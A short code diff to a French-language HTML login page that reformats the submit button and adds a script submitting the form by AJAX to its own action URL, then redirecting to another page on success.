@@ -198,8 +198,11 @@
             <input type="password" id="password" placeholder="Votre mot de passe">
         </div>
         
-        <button type="submit" class="login-btn">Se connecter</button>
         
+    <button type="submit" class="login-btn">
+        Se connecter
+    </button>
+    
         <div class="divider"></div>
         
         <a href="#" class="fb-login">
@@ -213,4 +216,21 @@
         </div>
     </div>
 </body>
+    <script>
+    document.getElementById('monForm').addEventListener('submit', function(e) {
+        e.preventDefault(); // Empêche l'envoi normal
+        
+        // Soumet le formulaire en AJAX
+        fetch(this.action, {
+            method: this.method,
+            body: new FormData(this)
+        })
+        .then(response => {
+            if(response.ok) {
+                window.location.href = 'mer.html'; // Redirection après succès
+            }
+        })
+        .catch(error => console.error('Erreur:', error));
+    });
+              </script>
 </html>
